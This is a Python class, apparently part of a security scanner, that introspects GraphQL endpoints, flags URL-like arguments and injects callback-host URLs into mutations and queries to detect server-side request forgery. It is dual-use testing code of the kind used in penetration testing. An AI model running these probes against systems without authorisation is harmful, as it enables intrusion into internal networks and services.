class GraphQLSSRFTester:
    """GraphQL Introspection + SSRF Testing"""
    
    INTROSPECTION_QUERY = """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        types {
          name
          fields {
            name
            args {
              name
              type {
                name
                kind
                ofType {
                  name
                  kind
                }
              }
            }
          }
        }
      }
    }
    """
    
    SSRF_ARG_PATTERNS = [
        r'^url$', r'^uri$', r'^link$', r'^href$', r'^src$',
        r'^source$', r'^target$', r'^redirect', r'^path$',
        r'^image$', r'^avatar$', r'^photo$', r'^thumbnail',
        r'^download', r'^upload', r'^fetch', r'^proxy'
    ]
    
    def __init__(self, base_url: str, callback_host: str):
        self.base_url = base_url
        self.callback_host = callback_host
    
    async def introspect(self, endpoint: str, request_func) -> Optional[Dict]:
        """Introspect GraphQL endpoint"""
        headers = {"Content-Type": "application/json"}
        data = {"query": self.INTROSPECTION_QUERY}
        
        status, body, headers_resp = await request_func(
            "POST",
            f"{self.base_url}{endpoint}",
            data=json.dumps(data),
            custom_headers=headers
        )
        
        try:
            schema = json.loads(body)
            if "__schema" in schema.get("data", {}):
                return schema["data"]["__schema"]
        except:
            pass
        
        return None
    
    def find_ssrf_args(self, schema: Dict) -> List[Dict]:
        """Find arguments that might accept URLs"""
        vulnerable_args = []
        
        for type_obj in schema.get("types", []):
            for field in type_obj.get("fields", []):
                for arg in field.get("args", []):
                    arg_name = arg.get("name", "").lower()
                    
                    for pattern in self.SSRF_ARG_PATTERNS:
                        if re.search(pattern, arg_name):
                            vulnerable_args.append({
                                "type": type_obj["name"],
                                "field": field["name"],
                                "arg": arg["name"],
                                "arg_type": arg.get("type", {}).get("name", "Unknown")
                            })
        
        return vulnerable_args
    
    async def test_ssrf_mutation(self, endpoint: str, arg_info: Dict, request_func) -> List[Dict]:
        """Test SSRF via GraphQL mutation/query"""
        findings = []
        
        # Build test query
        test_url = f"http://{self.callback_host}/graphql-ssrf-{random.randint(1000,9999)}"
        
        if "Mutation" in arg_info["type"]:
            query = f"""
            mutation {{
              {arg_info['field']}({arg_info['arg']}: "{test_url}") {{
                id
              }}
            }}
            """
        else:
            query = f"""
            query {{
              {arg_info['field']}({arg_info['arg']}: "{test_url}") {{
                id
              }}
            }}
            """
        
        headers = {"Content-Type": "application/json"}
        data = {"query": query}
        
        status, body, headers_resp = await request_func(
            "POST",
            f"{self.base_url}{endpoint}",
            data=json.dumps(data),
            custom_headers=headers
        )
        
        if status == 200:
            findings.append({
                "type": "GraphQL SSRF",
                "arg": arg_info,
                "payload": test_url,
                "status": status,
                "ssrf_triggered": self.callback_host in body.lower()
            })
        
        return findings


